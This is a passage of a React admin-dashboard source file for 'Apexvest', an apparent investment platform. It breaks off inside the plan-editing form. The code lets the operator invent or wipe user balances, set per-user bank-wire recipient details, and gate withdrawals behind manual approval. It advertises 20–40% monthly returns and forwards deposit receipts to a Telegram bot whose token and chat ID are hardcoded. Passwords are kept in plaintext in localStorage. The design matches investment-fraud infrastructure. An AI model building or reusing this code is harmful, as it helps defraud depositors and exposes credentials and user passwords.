"use client";

import React, { useState, useEffect } from "react";
import LucideIcon from "@/components/LucideIcon";
import "./admin.css";

export default function AdminDashboard() {
  const [activeTab, setActiveTab] = useState("users");
  const [plans, setPlans] = useState([]);
  const [users, setUsers] = useState([]);
  // Modal states
  const [activeModal, setActiveModal] = useState(null); // 'funds', 'password', 'wireInfo', 'editPlan', 'newPlan', 'viewReceipt'
  const [selectedUser, setSelectedUser] = useState(null);
  const [selectedPlan, setSelectedPlan] = useState(null);
  const [selectedReceipt, setSelectedReceipt] = useState(null);

  // Form states
  const [fundAmount, setFundAmount] = useState("");
  const [fundAction, setFundAction] = useState("add");
  const [newPassword, setNewPassword] = useState("");
  const [bankWireInfo, setBankWireInfo] = useState("");
  const [wireRecipientName, setWireRecipientName] = useState("");
  const [wireRecipientAddress, setWireRecipientAddress] = useState("");
  const [wireBankName, setWireBankName] = useState("");
  const [wireRoutingNumber, setWireRoutingNumber] = useState("");
  const [wireAccountNumber, setWireAccountNumber] = useState("");
  const [telegramBotToken, setTelegramBotToken] = useState("");
  const [telegramChatId, setTelegramChatId] = useState("");
  
  const [planForm, setPlanForm] = useState({
    id: "", name: "", roi: "", duration: "",
    depositType: "fixed", // "fixed" | "range"
    fixedAmount: "", minDeposit: "", maxDeposit: ""
  });

  // Per-user inline input state maps
  const [addFundInputs, setAddFundInputs] = useState({});   // { userId: amount string }
  const [removeFundInputs, setRemoveFundInputs] = useState({});
  const [passwordInputs, setPasswordInputs] = useState({});
  const [inlineSuccess, setInlineSuccess] = useState({}); // { userId-action: true }

  // Load data
  useEffect(() => {
    loadData();
  }, []);

  const loadData = () => {
    try {
      const storedUsers = JSON.parse(localStorage.getItem("allUsers") || "[]");
      setUsers(storedUsers);
      let currentToken = localStorage.getItem("telegramBotToken");
      let currentChatId = localStorage.getItem("telegramChatId");
      if (!currentToken) {
        currentToken = "8606921616:AAGxD4J__zxovB4yZiBtNdZnI-Ljvwytp6c";
        localStorage.setItem("telegramBotToken", currentToken);
      }
      if (!currentChatId) {
        currentChatId = "8486489983";
        localStorage.setItem("telegramChatId", currentChatId);
      }
      setTelegramBotToken(currentToken);
      setTelegramChatId(currentChatId);

      const defaultPlans = [
        { id: "diamond", name: "Diamond Plan", roi: "20%", minDeposit: 500, depositType: "fixed", fixedAmount: 500, duration: "1 month" },
        { id: "premium", name: "Premium Plan", roi: "40%", minDeposit: 1500, depositType: "range", minDeposit: 1500, maxDeposit: 10000, duration: "1 month" }
      ];
      const storedPlans = JSON.parse(localStorage.getItem("investmentPlans") || "null");
      setPlans(storedPlans || defaultPlans);
      if (!storedPlans) {
        localStorage.setItem("investmentPlans", JSON.stringify(defaultPlans));
      }
    } catch (e) {
      console.error(e);
    }
  };

  const broadcastAdminAction = (type, payload = {}) => {
    try {
      const bc = new BroadcastChannel("apexvest-admin");
      bc.postMessage({ type, ...payload });
      bc.close();
    } catch (e) {
      console.error("BroadcastChannel error:", e);
    }
  };

  const saveUsers = (newUsers) => {
    setUsers(newUsers);
    localStorage.setItem("allUsers", JSON.stringify(newUsers));
    broadcastAdminAction("users-updated");
  };

  const savePlans = (newPlans) => {
    setPlans(newPlans);
    localStorage.setItem("investmentPlans", JSON.stringify(newPlans));
    broadcastAdminAction("users-updated"); // Trigger sync in user dashboard
  };



  // User Actions
  const handleFundSubmit = (e) => {
    e.preventDefault();
    const amount = parseFloat(fundAmount);
    if (isNaN(amount) || amount <= 0) return alert("Invalid amount");

    const updatedUsers = users.map(u => {
      if (u.id === selectedUser.id) {
        let newBalance = parseFloat(u.portfolioBalance) || 0;
        let newTotalDeposits = parseFloat(u.totalDeposits) || 0;
        if (fundAction === "add") {
          newBalance += amount;
          newTotalDeposits += amount;
        } else {
          newBalance = Math.max(0, newBalance - amount);
        }
        return { ...u, portfolioBalance: newBalance, totalDeposits: newTotalDeposits };
      }
      return u;
    });
    saveUsers(updatedUsers);
    closeModal();
  };

  const handleResetFunds = (userId) => {
    if (!confirm("Are you sure you want to reset this user's balance to $0?")) return;
    // Always read fresh data from localStorage to avoid stale state
    const fresh = JSON.parse(localStorage.getItem("allUsers") || "[]");
    const updatedUsers = fresh.map(u => u.id === userId ? { ...u, portfolioBalance: 0 } : u);
    saveUsers(updatedUsers);
  };

  // Inline card handlers - always read from localStorage for freshest balance
  const handleInlineAddFunds = (userId) => {
    const amount = parseFloat(addFundInputs[userId] || "");
    if (isNaN(amount) || amount <= 0) return alert("Enter a valid amount.");
    const fresh = JSON.parse(localStorage.getItem("allUsers") || "[]");
    const updatedUsers = fresh.map(u => {
      if (u.id === userId) {
        const newBalance = (parseFloat(u.portfolioBalance) || 0) + amount;
        const newDeposits = (parseFloat(u.totalDeposits) || 0) + amount;
        return { ...u, portfolioBalance: newBalance, totalDeposits: newDeposits };
      }
      return u;
    });
    saveUsers(updatedUsers);
    setAddFundInputs(prev => ({ ...prev, [userId]: "" }));
    flashSuccess(userId, "add");
  };

  const handleInlineRemoveFunds = (userId) => {
    const amount = parseFloat(removeFundInputs[userId] || "");
    if (isNaN(amount) || amount <= 0) return alert("Enter a valid amount.");
    const fresh = JSON.parse(localStorage.getItem("allUsers") || "[]");
    const target = fresh.find(u => u.id === userId);
    if (!target) return;
    const currentBalance = parseFloat(target.portfolioBalance) || 0;
    if (amount > currentBalance) {
      return alert(`Cannot remove $${amount.toLocaleString()} - user only has $${currentBalance.toLocaleString('en-US', { minimumFractionDigits: 2 })} balance.`);
    }
    const updatedUsers = fresh.map(u => {
      if (u.id === userId) {
        const newBalance = Math.max(0, currentBalance - amount);
        return { ...u, portfolioBalance: newBalance };
      }
      return u;
    });
    saveUsers(updatedUsers);
    setRemoveFundInputs(prev => ({ ...prev, [userId]: "" }));
    flashSuccess(userId, "remove");
  };

  const handleInlinePasswordReset = (userId) => {
    const pwd = (passwordInputs[userId] || "").trim();
    if (!pwd) return alert("Password cannot be empty.");
    const updatedUsers = users.map(u => u.id === userId ? { ...u, password: pwd } : u);
    saveUsers(updatedUsers);
    setPasswordInputs(prev => ({ ...prev, [userId]: "" }));
    flashSuccess(userId, "pwd");
  };

  const flashSuccess = (userId, action) => {
    const key = `${userId}-${action}`;
    setInlineSuccess(prev => ({ ...prev, [key]: true }));
    setTimeout(() => setInlineSuccess(prev => ({ ...prev, [key]: false })), 2000);
  };

  const handleDeleteUser = (userId) => {
    if (!confirm("Are you sure you want to completely delete this user?")) return;
    const updatedUsers = users.filter(u => u.id !== userId);
    saveUsers(updatedUsers);
  };

  const handleChangePassword = (e) => {
    e.preventDefault();
    if (!newPassword.trim()) return alert("Password cannot be empty");
    const updatedUsers = users.map(u => u.id === selectedUser.id ? { ...u, password: newPassword } : u);
    saveUsers(updatedUsers);
    alert("Password updated!");
    closeModal();
  };

  const handleBankWireSubmit = (e) => {
    e.preventDefault();
    const updatedUsers = users.map(u => {
      if (u.id === selectedUser.id) {
        return {
          ...u,
          adminBankWireInfo: bankWireInfo,
          wireRecipientName,
          wireRecipientAddress,
          wireBankName,
          wireRoutingNumber,
          wireAccountNumber
        };
      }
      return u;
    });
    saveUsers(updatedUsers);
    alert("Bank wire instructions updated!");
    closeModal();
  };

  // Transaction Actions
  const handleApproveTransaction = (userId, txnId) => {
    const updatedUsers = users.map(u => {
      if (u.id === userId) {
        let newBalance = parseFloat(u.portfolioBalance) || 0;
        let newPending = parseFloat(u.pendingWithdrawal) || 0;
        let newTotalDeposits = parseFloat(u.totalDeposits) || 0;

        const updatedTxns = u.userTransactionsList.map(t => {
          if (t.id === txnId && t.status === "Pending") {
            if (t.type === "deposit") {
              newBalance += parseFloat(t.amount) || 0;
              newTotalDeposits += parseFloat(t.amount) || 0;
            } else if (t.type === "withdrawal") {
              newPending = Math.max(0, newPending - (parseFloat(t.amount) || 0)); // Already deducted from balance during request
            }
            return { ...t, status: "Completed" };
          }
          return t;
        });

        return { 
          ...u, 
          portfolioBalance: newBalance, 
          pendingWithdrawal: newPending,
          totalDeposits: newTotalDeposits,
          userTransactionsList: updatedTxns 
        };
      }
      return u;
    });
    saveUsers(updatedUsers);
  };

  const handleDeclineTransaction = (userId, txnId) => {
    const updatedUsers = users.map(u => {
      if (u.id === userId) {
        let newBalance = parseFloat(u.portfolioBalance) || 0;
        let newPending = parseFloat(u.pendingWithdrawal) || 0;

        const updatedTxns = u.userTransactionsList.map(t => {
          if (t.id === txnId && t.status === "Pending") {
            if (t.type === "withdrawal") {
              // Refund the balance if declined
              newBalance += parseFloat(t.amount) || 0;
              newPending = Math.max(0, newPending - (parseFloat(t.amount) || 0));
            }
            return { ...t, status: "Declined" };
          }
          return t;
        });

        return { ...u, portfolioBalance: newBalance, pendingWithdrawal: newPending, userTransactionsList: updatedTxns };
      }
      return u;
    });
    saveUsers(updatedUsers);
  };
  // Plan Actions
  const handleSavePlan = (e) => {
    e.preventDefault();
    const planData = {
      ...planForm,
      minDeposit: planForm.depositType === "fixed"
        ? parseFloat(planForm.fixedAmount) || 0
        : parseFloat(planForm.minDeposit) || 0,
      maxDeposit: planForm.depositType === "range"
        ? parseFloat(planForm.maxDeposit) || 0
        : null,
      depositType: planForm.depositType,
      fixedAmount: planForm.depositType === "fixed" ? parseFloat(planForm.fixedAmount) || 0 : null,
      duration: planForm.duration
    };
    if (activeModal === "newPlan") {
      const newPlan = { ...planData, id: `plan-${Date.now()}` };
      savePlans([...plans, newPlan]);
    } else {
      const updatedPlans = plans.map(p => p.id === planForm.id ? planData : p);
      savePlans(updatedPlans);
    }
    closeModal();
  };

  const handleDeletePlan = (planId) => {
    if (!confirm("Are you sure you want to delete this investment plan?")) return;
    const updatedPlans = plans.filter(p => p.id !== planId);
    savePlans(updatedPlans);
  };

  // Helpers
  // Helpers
  const openModal = (type, user = null, plan = null) => {
    setActiveModal(type);
    setSelectedUser(user);
    if (user) {
      setBankWireInfo(user.adminBankWireInfo || "");
      setWireRecipientName(user.wireRecipientName || "");
      setWireRecipientAddress(user.wireRecipientAddress || "");
      setWireBankName(user.wireBankName || "");
      setWireRoutingNumber(user.wireRoutingNumber || "");
      setWireAccountNumber(user.wireAccountNumber || "");
    }
    if (plan) {
      setPlanForm({
        id: plan.id || "",
        name: plan.name || "",
        roi: plan.roi || "",
        duration: plan.duration || "",
        depositType: plan.depositType || "fixed",
        fixedAmount: plan.fixedAmount != null ? String(plan.fixedAmount) : String(plan.minDeposit || ""),
        minDeposit: plan.minDeposit != null ? String(plan.minDeposit) : "",
        maxDeposit: plan.maxDeposit != null ? String(plan.maxDeposit) : ""
      });
    } else {
      setPlanForm({ id: "", name: "", roi: "", duration: "", depositType: "fixed", fixedAmount: "", minDeposit: "", maxDeposit: "" });
    }
    setFundAmount("");
    setNewPassword("");
  };

  const closeModal = () => {
    setActiveModal(null);
    setSelectedUser(null);
    setSelectedReceipt(null);
    setWireRecipientName("");
    setWireRecipientAddress("");
    setWireBankName("");
    setWireRoutingNumber("");
    setWireAccountNumber("");
  };

  const handleViewReceipt = (txn) => {
    setSelectedReceipt(txn);
    setActiveModal("viewReceipt");
  };

  const allPendingTransactions = users.flatMap(u => 
    (u.userTransactionsList || [])
      .filter(t => t.status === "Pending")
      .map(t => ({ ...t, userId: u.id, userName: u.userName, userEmail: u.userEmail }))
  );

  return (
    <div className="admin-container">
      {/* Sidebar */}
      <aside className="admin-sidebar">
        <div className="admin-brand">
          <LucideIcon name="shield" style={{ color: "#e2ff3b" }} /> Apexvest Admin
        </div>
        <ul className="admin-menu">
          <li><a className={activeTab === "users" ? "active" : ""} onClick={() => setActiveTab("users")}><LucideIcon name="users" /> Manage Users</a></li>
          <li>
            <a className={activeTab === "transactions" ? "active" : ""} onClick={() => setActiveTab("transactions")}>
              <LucideIcon name="list" /> Transactions
              {allPendingTransactions.length > 0 && <span style={{ background: "#ef4444", color: "#fff", padding: "2px 8px", borderRadius: "10px", fontSize: "11px", marginLeft: "auto" }}>{allPendingTransactions.length}</span>}
            </a>
          </li>
          <li><a className={activeTab === "plans" ? "active" : ""} onClick={() => setActiveTab("plans")}><LucideIcon name="trending-up" /> Investment Plans</a></li>
          <li><a className={activeTab === "settings" ? "active" : ""} onClick={() => setActiveTab("settings")}><LucideIcon name="settings" /> System Settings</a></li>
          <li><a href="/dashboard" style={{ marginTop: "auto", borderTop: "1px solid #1f2937", paddingTop: "20px" }}><LucideIcon name="log-out" /> Back to Dashboard</a></li>
        </ul>
      </aside>

      {/* Main Content */}
      <main className="admin-main">
        <div className="admin-header">
          <h1>
            {activeTab === "users" && "User Management"}
            {activeTab === "transactions" && "Pending Transactions"}
            {activeTab === "plans" && "Investment Plans"}
            {activeTab === "settings" && "System Settings"}
          </h1>
        </div>
        {/* Users Tab - card per user */}
        {activeTab === "users" && (
          <div>
            {users.length === 0 && (
              <div className="admin-card" style={{ textAlign: "center", padding: "60px 24px", color: "#64748b" }}>
                <div style={{ fontSize: 48, marginBottom: 16, color: "#cbd5e1" }}><LucideIcon name="users" /></div>
                <div style={{ fontSize: 16, fontWeight: 600, marginBottom: 8 }}>No users yet</div>
                <div style={{ fontSize: 13 }}>Users who sign up will appear here.</div>
              </div>
            )}
            <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fill, minmax(280px, 1fr))", gap: 16 }}>
              {users.map(u => (
                <div key={u.id} className="admin-card" style={{ padding: 0, overflow: "hidden", border: "1px solid #e2e8f0", borderRadius: 10, boxShadow: "0 1px 6px rgba(0,0,0,0.07)" }}>

                  {/* Card Header */}
                  <div style={{ background: "linear-gradient(135deg, #1e293b 0%, #0f172a 100%)", padding: "14px 16px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                    <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                      <div style={{ width: 34, height: 34, borderRadius: "50%", background: "linear-gradient(135deg, #e2ff3b, #a3c40d)", display: "flex", alignItems: "center", justifyContent: "center", fontWeight: 800, fontSize: 14, color: "#0f172a", flexShrink: 0 }}>
                        {(u.userName || "?")[0].toUpperCase()}
                      </div>
                      <div>
                        <div style={{ fontWeight: 700, fontSize: 13, color: "#f8fafc" }}>{u.userName}</div>
                        <div style={{ fontSize: 11, color: "#64748b", marginTop: 1 }}>{u.userEmail}</div>
                      </div>
                    </div>
                    <button className="admin-btn admin-btn-danger" style={{ padding: "4px 8px" }} title="Delete user" onClick={() => handleDeleteUser(u.id)}>
                      <LucideIcon name="trash-2" />
                    </button>
                  </div>

                  {/* Balance Row */}
                  <div style={{ padding: "10px 16px", borderBottom: "1px solid #e2e8f0", display: "flex", alignItems: "center", justifyContent: "space-between", background: "#f8fafc" }}>
                    <span style={{ fontSize: 12, color: "#64748b", fontWeight: 500 }}>Balance</span>
                    <span style={{ fontSize: 16, fontWeight: 800, color: "#10b981" }}>
                      ${(parseFloat(u.portfolioBalance) || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })}
                    </span>
                  </div>

                  {/* Card Body - Inline Actions */}
                  <div style={{ padding: "12px 16px", display: "flex", flexDirection: "column", gap: 10, background: "#fff" }}>

                    {/* Add Funds */}
                    <div>
                      <label style={{ fontSize: 10, color: "#10b981", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.06em", display: "block", marginBottom: 5 }}>Add Funds</label>
                      <div style={{ display: "flex", gap: 6 }}>
                        <input type="number" min="0" className="admin-input" style={{ marginBottom: 0, flex: 1, padding: "7px 10px", fontSize: 13 }} placeholder="Amount ($)" value={addFundInputs[u.id] || ""} onChange={e => setAddFundInputs(prev => ({ ...prev, [u.id]: e.target.value }))} />
                        <button className="admin-btn admin-btn-success" style={{ flexShrink: 0, padding: "7px 12px", fontSize: 12 }} onClick={() => handleInlineAddFunds(u.id)}>
                          {inlineSuccess[`${u.id}-add`] ? <LucideIcon name="check" /> : "Add"}
                        </button>
                      </div>
                    </div>

                    {/* Remove Funds */}
                    <div>
                      <label style={{ fontSize: 10, color: "#ef4444", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.06em", display: "block", marginBottom: 5 }}>Remove Funds</label>
                      <div style={{ display: "flex", gap: 6 }}>
                        <input type="number" min="0" className="admin-input" style={{ marginBottom: 0, flex: 1, padding: "7px 10px", fontSize: 13 }} placeholder="Amount ($)" value={removeFundInputs[u.id] || ""} onChange={e => setRemoveFundInputs(prev => ({ ...prev, [u.id]: e.target.value }))} />
                        <button className="admin-btn admin-btn-danger" style={{ flexShrink: 0, padding: "7px 12px", fontSize: 12 }} onClick={() => handleInlineRemoveFunds(u.id)}>
                          {inlineSuccess[`${u.id}-remove`] ? <LucideIcon name="check" /> : "Remove"}
                        </button>
                      </div>
                    </div>

                    {/* Reset $0 */}
                    <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", background: "rgba(239,68,68,0.05)", borderRadius: 6, padding: "7px 10px", border: "1px solid rgba(239,68,68,0.1)" }}>
                      <span style={{ fontSize: 12, color: "#94a3b8" }}>Reset to <strong style={{ color: "#ef4444" }}>$0</strong></span>
                      <button className="admin-btn admin-btn-danger" style={{ padding: "4px 10px", fontSize: 11 }} onClick={() => handleResetFunds(u.id)}>Reset $0</button>
                    </div>

                    {/* Bank Wire Details */}
                    <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", background: "rgba(99,102,241,0.05)", borderRadius: 6, padding: "7px 10px", border: "1px solid rgba(99,102,241,0.1)" }}>
                      <span style={{ fontSize: 12, color: "#94a3b8" }}>Wire Transfer</span>
                      <button className="admin-btn" style={{ padding: "4px 10px", fontSize: 11, background: "#6366f1", color: "#fff" }} onClick={() => openModal("wireInfo", u)}>Edit Wire Details</button>
                    </div>

                    {/* Password Reset */}
                    <div>
                      <label style={{ fontSize: 10, color: "#6366f1", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.06em", display: "block", marginBottom: 5 }}>Reset Password</label>
                      <div style={{ display: "flex", gap: 6 }}>
                        <input type="text" className="admin-input" style={{ marginBottom: 0, flex: 1, padding: "7px 10px", fontSize: 13 }} placeholder="New password" value={passwordInputs[u.id] || ""} onChange={e => setPasswordInputs(prev => ({ ...prev, [u.id]: e.target.value }))} />
                        <button className="admin-btn admin-btn-primary" style={{ flexShrink: 0, padding: "7px 12px", fontSize: 12 }} onClick={() => handleInlinePasswordReset(u.id)}>
                          {inlineSuccess[`${u.id}-pwd`] ? <LucideIcon name="check" /> : "Set"}
                        </button>
                      </div>
                    </div>

                  </div>
                </div>
              ))}
            </div>
          </div>
        )}



        {/* Transactions Tab */}
        {activeTab === "transactions" && (
          <div className="admin-card" style={{ overflowX: "auto" }}>
            <table className="admin-table">
              <thead>
                <tr>
                  <th>User</th>
                  <th>Type</th>
                  <th>Amount</th>
                  <th>Details</th>
                  <th>Actions</th>
                </tr>
              </thead>
              <tbody>
                {allPendingTransactions.map(t => (
                  <tr key={t.id}>
                    <td>
                      <div style={{ fontWeight: "600", color: "#fff" }}>{t.userName}</div>
                      <div style={{ fontSize: "12px", color: "#94a3b8" }}>{t.userEmail}</div>
                    </td>
                    <td><span className="badge badge-pending">{t.type.toUpperCase()}</span></td>
                    <td style={{ fontWeight: "600", color: t.type === "deposit" ? "#10b981" : "#ef4444" }}>
                      {t.type === "deposit" ? "+" : "-"}${t.amount.toLocaleString()}
                    </td>
                    <td style={{ fontSize: "13px" }}>
                      {t.title}
                      <br/>
                      <span style={{ color: "#94a3b8" }}>{t.detail}</span>
                      {t.receipt && (
                        <div>
                          <button 
                            className="admin-btn" 
                            style={{ 
                              background: "rgba(99, 102, 241, 0.15)", 
                              color: "#818cf8", 
                              border: "1px solid rgba(99, 102, 241, 0.2)",
                              padding: "4px 8px", 
                              fontSize: "11px", 
                              marginTop: "6px" 
                            }}
                            onClick={() => handleViewReceipt(t)}
                          >
                            <LucideIcon name="eye" style={{ width: "12px", height: "12px" }} /> View Receipt
                          </button>
                        </div>
                      )}
                    </td>
                    <td>
                      <div className="flex-gap">
                        <button className="admin-btn admin-btn-success" onClick={() => handleApproveTransaction(t.userId, t.id)}>Approve</button>
                        <button className="admin-btn admin-btn-danger" onClick={() => handleDeclineTransaction(t.userId, t.id)}>Decline</button>
                      </div>
                    </td>
                  </tr>
                ))}
                {allPendingTransactions.length === 0 && (
                  <tr><td colSpan="5" style={{ textAlign: "center", padding: "40px" }}>No pending transactions to review.</td></tr>
                )}
              </tbody>
            </table>
          </div>
        )}

        {/* Plans Tab */}
        {activeTab === "plans" && (
          <>
            <button className="admin-btn admin-btn-primary" style={{ marginBottom: "20px" }} onClick={() => openModal("newPlan")}>
              <LucideIcon name="plus" /> Create New Plan
            </button>
            <div className="admin-card" style={{ overflowX: "auto" }}>
              <table className="admin-table">
                <thead>
                  <tr>
                    <th>Plan Name</th>
                    <th>Deposit Limits</th>
                    <th>ROI</th>
                    <th>Duration</th>
                    <th>Actions</th>
                  </tr>
                </thead>
                <tbody>
                  {plans.map(p => (
                    <tr key={p.id}>
                      <td style={{ fontWeight: "600", color: "#fff" }}>{p.name}</td>
                      <td>
                        {p.depositType === "range"
                          ? <span>${parseFloat(p.minDeposit || 0).toLocaleString()} - ${parseFloat(p.maxDeposit || 0).toLocaleString()}</span>
                          : <span>${parseFloat(p.fixedAmount || p.minDeposit || 0).toLocaleString()}</span>}
                        <span style={{ marginLeft: 6, fontSize: 11, padding: "2px 6px", borderRadius: 4, background: p.depositType === "range" ? "rgba(99,102,241,0.15)" : "rgba(16,185,129,0.12)", color: p.depositType === "range" ? "#818cf8" : "#10b981" }}>
                          {p.depositType === "range" ? "Range" : "Fixed"}
                        </span>
                      </td>
                      <td style={{ color: "#e2ff3b", fontWeight: 600 }}>{p.roi}</td>
                      <td style={{ color: "#94a3b8" }}>{p.duration || "N/A"}</td>
                      <td>
                        <div className="flex-gap">
                          <button className="admin-btn" style={{ background: "#334155", color: "#fff" }} onClick={() => openModal("editPlan", null, p)}>Edit</button>
                          <button className="admin-btn admin-btn-danger" onClick={() => handleDeletePlan(p.id)}>Delete</button>
                        </div>
                      </td>
                    </tr>
                  ))}
                  {plans.length === 0 && (
                    <tr><td colSpan="5" style={{ textAlign: "center", padding: "40px" }}>No investment plans configured.</td></tr>
                  )}
                </tbody>
              </table>
            </div>
          </>
        )}

        {activeTab === "settings" && (
          <div className="admin-card" style={{ maxWidth: "600px", padding: "24px" }}>
            <h3 style={{ borderBottom: "1px solid #334155", paddingBottom: "10px", marginBottom: "20px", display: "flex", alignItems: "center", gap: "8px", color: "#fff" }}>
              <LucideIcon name="bell" style={{ color: "#e2ff3b" }} /> Telegram Bot Integration
            </h3>
            <p style={{ color: "#94a3b8", fontSize: "13px", lineHeight: "1.5", marginBottom: "20px" }}>
              Configure a Telegram bot to automatically receive payment receipts whenever users confirm deposits. You can create a bot by messaging <strong>@BotFather</strong> on Telegram and retrieve your Chat ID by messaging <strong>@userinfobot</strong>.
            </p>
            <div className="form-group" style={{ marginBottom: "16px" }}>
              <label style={{ display: "block", marginBottom: "6px", color: "#94a3b8", fontSize: "12px", fontWeight: "600" }}>Telegram Bot Token</label>
              <input 
                type="text" 
                className="admin-input" 
                placeholder="e.g. 1234567890:ABCdefGhIJKlmNoPQRsTUVwxyZ" 
                value={telegramBotToken} 
                onChange={e => {
                  setTelegramBotToken(e.target.value);
                  localStorage.setItem("telegramBotToken", e.target.value);
                }} 
              />
            </div>
            <div className="form-group" style={{ marginBottom: "20px" }}>
              <label style={{ display: "block", marginBottom: "6px", color: "#94a3b8", fontSize: "12px", fontWeight: "600" }}>Telegram Chat ID</label>
              <input 
                type="text" 
                className="admin-input" 
                placeholder="e.g. 987654321" 
                value={telegramChatId} 
                onChange={e => {
                  setTelegramChatId(e.target.value);
                  localStorage.setItem("telegramChatId", e.target.value);
                }} 
              />
            </div>
            <button className="admin-btn admin-btn-primary" onClick={() => alert("Telegram settings saved successfully!")}>
              Save Configuration
            </button>
          </div>
        )}

      </main>

      {/* Modals */}
      <div className={`modal-overlay ${activeModal ? "active" : ""}`} onClick={closeModal} style={{ display: activeModal ? "flex" : "none" }}>
        <div className="modal-content" onClick={e => e.stopPropagation()}>
          
          {/* Manage Funds Modal */}
          {activeModal === "funds" && (
            <form onSubmit={handleFundSubmit}>
              <div className="modal-header">
                <h3>Manage Funds: {selectedUser?.userName}</h3>
                <LucideIcon name="x" style={{ cursor: "pointer", color: "#94a3b8" }} onClick={closeModal} />
              </div>
              <div className="form-group">
                <label>Action</label>
                <select className="admin-input" value={fundAction} onChange={e => setFundAction(e.target.value)}>
                  <option value="add">Add Funds</option>
                  <option value="remove">Remove Funds</option>
                </select>
              </div>
              <div className="form-group">
                <label>Amount ($)</label>
                <input type="number" className="admin-input" value={fundAmount} onChange={e => setFundAmount(e.target.value)} placeholder="1000" required />
              </div>
              <button type="submit" className="admin-btn admin-btn-primary" style={{ width: "100%", justifyContent: "center", marginTop: "16px" }}>Process Funds</button>
            </form>
          )}

          {/* Change Password Modal */}
          {activeModal === "password" && (
            <form onSubmit={handleChangePassword}>
              <div className="modal-header">
                <h3>Change Password: {selectedUser?.userName}</h3>
                <LucideIcon name="x" style={{ cursor: "pointer", color: "#94a3b8" }} onClick={closeModal} />
              </div>
              <div className="form-group">
                <label>New Password</label>
                <input type="text" className="admin-input" value={newPassword} onChange={e => setNewPassword(e.target.value)} required />
              </div>
              <button type="submit" className="admin-btn admin-btn-primary" style={{ width: "100%", justifyContent: "center", marginTop: "16px" }}>Update Password</button>
            </form>
          )}

          {/* Bank Wire Info Modal */}
          {activeModal === "wireInfo" && (
            <form onSubmit={handleBankWireSubmit}>
              <div className="modal-header">
                <h3>Custom Bank Wire Info: {selectedUser?.userName}</h3>
                <LucideIcon name="x" style={{ cursor: "pointer", color: "#94a3b8" }} onClick={closeModal} />
              </div>
              
              <div className="form-group">
                <label>Recipient's Full Legal Name</label>
                <input 
                  type="text" 
                  className="admin-input" 
                  value={wireRecipientName} 
                  onChange={e => setWireRecipientName(e.target.value)} 
                  placeholder="e.g. Apexvest Ltd" 
                  required 
                />
              </div>

              <div className="form-group">
                <label>Recipient's Physical Address</label>
                <input 
                  type="text" 
                  className="admin-input" 
                  value={wireRecipientAddress} 
                  onChange={e => setWireRecipientAddress(e.target.value)} 
                  placeholder="e.g. 123 Financial Way, NY" 
                  required 
                />
              </div>

              <div className="form-group">
                <label>Recipient's Bank Name</label>
                <input 
                  type="text" 
                  className="admin-input" 
                  value={wireBankName} 
                  onChange={e => setWireBankName(e.target.value)} 
                  placeholder="e.g. JPMorgan Chase" 
                  required 
                />
              </div>

              <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "12px" }}>
                <div className="form-group">
                  <label>Wire Routing Number</label>
                  <input 
                    type="text" 
                    className="admin-input" 
                    value={wireRoutingNumber} 
                    onChange={e => setWireRoutingNumber(e.target.value)} 
                    placeholder="e.g. 021000021" 
                    required 
                  />
                </div>
                <div className="form-group">
                  <label>Account Number</label>
                  <input 
                    type="text" 
                    className="admin-input" 
                    value={wireAccountNumber} 
                    onChange={e => setWireAccountNumber(e.target.value)} 
                    placeholder="e.g. 123456789" 
                    required 
                  />
                </div>
              </div>

              <div className="form-group">
                <label>General Instructions / Notes (Optional)</label>
                <textarea 
                  className="admin-input" 
                  rows="2" 
                  value={bankWireInfo} 
                  onChange={e => setBankWireInfo(e.target.value)} 
                  placeholder="Please transfer funds and send receipt..."
                ></textarea>
              </div>

              <button type="submit" className="admin-btn admin-btn-primary" style={{ width: "100%", justifyContent: "center", marginTop: "16px" }}>Save Wire Details</button>
            </form>
          )}

          {/* Plan Modal */}
          {(activeModal === "newPlan" || activeModal === "editPlan") && (
            <form onSubmit={handleSavePlan}>
              <div className="modal-header">
                <h3>{activeModal === "newPlan" ? "Create New Plan" : "Edit Plan"}</h3>
                <LucideIcon name="x" style={{ cursor: "pointer", color: "#94a3b8" }} onClick={closeModal} />
              </div>

              {/* Plan Name */}
              <div className="form-group">
                <label>Plan Name</label>
                <input
                  type="text"
                  className="admin-input"
                  placeholder="e.g. Gold Plan"
                  value={planForm.name}
                  onChange={e => setPlanForm({ ...planForm, name: e.target.value })}
                  required
                />
              </div>

              {/* Deposit Type Checkbox */}
              <div className="form-group">
                <label style={{ display: "flex", alignItems: "center", gap: 10, cursor: "pointer", fontSize: 14, color: "#e2e8f0", marginTop: 8 }}>
                  <input
                    type="checkbox"
                    checked={planForm.depositType === "fixed"}
                    onChange={e => setPlanForm({
                      ...planForm,
                      depositType: e.target.checked ? "fixed" : "range",
                      fixedAmount: "",
                      minDeposit: "",
                      maxDeposit: ""
                    })}
                    style={{ accentColor: "#e2ff3b", width: 18, height: 18, cursor: "pointer" }}
                  />
                  <span>This is a Fixed Deposit Plan (instead of Normal/Range)</span>
                </label>
              </div>

              {/* Fixed Amount */}
              {planForm.depositType === "fixed" && (
                <div className="form-group">
                  <label>Fixed Deposit Amount ($)</label>
                  <input
                    type="number"
                    min="0"
                    className="admin-input"
                    placeholder="e.g. 500"
                    value={planForm.fixedAmount}
                    onChange={e => setPlanForm({ ...planForm, fixedAmount: e.target.value })}
                    required
                  />
                </div>
              )}

              {/* Range */}
              {planForm.depositType === "range" && (
                <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
                  <div className="form-group">
                    <label>Min Deposit ($)</label>
                    <input
                      type="number"
                      min="0"
                      className="admin-input"
                      placeholder="e.g. 100"
                      value={planForm.minDeposit}
                      onChange={e => setPlanForm({ ...planForm, minDeposit: e.target.value })}
                      required
                    />
                  </div>
                  <div className="form-group">
                    <label>Max Deposit ($)</label>
                    <input
                      type="number"
                      min="0"
                      className="admin-input"
                      placeholder="e.g. 5000"
                      value={planForm.maxDeposit}
                      onChange={e => setPlanForm({ ...planForm, maxDeposit: e.target.value })}
                      required
                    />
                  </div>
                </div>
              )}

              {/* ROI */}
              <div className="form-group">
                <label>ROI / Profit Return (%)</label>
                <input
                  type="text"
